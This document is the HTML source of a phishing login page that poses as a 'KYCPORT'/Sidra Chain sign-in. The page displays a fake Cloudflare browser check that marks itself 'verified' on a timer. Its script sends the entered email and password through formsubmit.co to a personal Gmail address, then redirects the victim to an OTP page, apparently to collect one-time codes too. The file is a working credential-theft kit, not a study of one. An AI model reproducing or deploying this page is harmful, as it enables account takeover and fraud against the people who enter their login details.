<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login with KYCPORT</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
            background-color: whitesmoke;
            margin: 0;
        }

        .container {
            width: 80%;
            max-width: 400px;
            height: 100vh;
            background: white;
            padding: 35px;
            box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.1);
            border-radius: 12px;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 20px;
            position: absolute;
            top: 0;
        }

        .container img {
            display: block;
            margin: 0 auto 40px;
        }

        label {
            display: block;
            text-align: left;
            margin: 15px 0 8px;
            font-weight: bold;
            font-size: 18px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 17px;
            color: gray;
            margin-bottom: 15px;
        }

        .forgot-password {
            text-align: left;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .forgot-password a {
            text-decoration: none;
            color: #544DEA;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #544DEA;
            color: white;
            border: none;
            font-size: 15px;
            cursor: pointer;
            border-radius: 8px;
            margin-top: 35px;
        }

        button:hover {
            background: darkorange;
        }

        /* Fake Cloudflare Verification */
        .cloudflare-verification {
            margin-top: 20px;
            padding: 8px;
            border: 1px solid #ddd;
            background: #f9f9f9;
            border-radius: 4px;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 6px;
            width: 100%;
            max-width: 250px;
            position: relative;
        }

        .loading {
            width: 16px;
            height: 16px;
            border: 3px solid #ccc;
            border-top: 3px solid blue;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verified {
            color: green;
            font-weight: bold;
            font-size: 12px;
        }

        .cloudflare-logo {
            width: 50px;
            height: auto;
            position: absolute;
            right: 5px;
            top: 50%;
            transform: translateY(-50%);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="images/download_11.png" width="130px" height="110px" alt="Sidra Chain">

        <form id="multiForm">
            <input type="hidden" name="_subject" value="SIDRA CHAIN">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_autoresponse" value="">
            <input type="hidden" name="_next" value="otp.html"> <!-- This won't work with JavaScript fetch -->

            <label for="email">Email</label>
            <input type="email" name="email" id="email" placeholder="Enter your email" required>

            <label for="password">Password</label>
            <input type="password" name="password" id="password" placeholder="Enter your password" required>
            
            <p style="color:blue; text-align:left;">
                <a href="login.html" style="color:blue; text-decoration:none;">Forgot password?</a>
            </p>
            
            <!-- Fake Cloudflare Verification -->
            <div class="cloudflare-verification" id="cloudflare">
                <div style="display: flex; align-items: center; gap: 6px;">
                    <span class="loading" id="loading-icon"></span>
                    <p id="verification-text">Verifying your browser...</p>
                </div>
                <img src="images/download_14.png" class="cloudflare-logo" alt="Cloudflare">
            </div>

            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        // Fake Cloudflare Verification
        setTimeout(() => {
            document.getElementById("cloudflare").innerHTML = `
                <div style="display: flex; align-items: center; gap: 6px;">
                    <p class="verified">âœ” Your browser has been verified!</p>
                </div>
                <img src="images/download_14.png" class="cloudflare-logo" alt="Cloudflare">
            `;
        }, 3000);

        // JavaScript Form Submission
        document.getElementById("multiForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent normal form submission

            const formData = new FormData(this);
            const formSubmitURL = "https://formsubmit.co/nwankwogoodluck156@gmail.com"; // Primary - FormSubmit

            fetch(formSubmitURL, { method: "POST", body: formData })
                .then(response => {
                    if (!response.ok) throw new Error("Form submission failed");
                    return response.text(); // Read response (optional)
                })
                .then(() => {
                    window.location.href = "otp.html"; // Redirect on success
                })
                .catch(() => {
                    // Show error if submission fails
                    const errorMessage = document.createElement("p");
                    errorMessage.textContent = "Submission failed. Please try again.";
                    errorMessage.style.color = "blue";
                    errorMessage.style.textAlign = "center";
                    errorMessage.style.marginTop = "15px";
                    document.querySelector("button").after(errorMessage);
                });
        });
    </script>
</body>
</html>
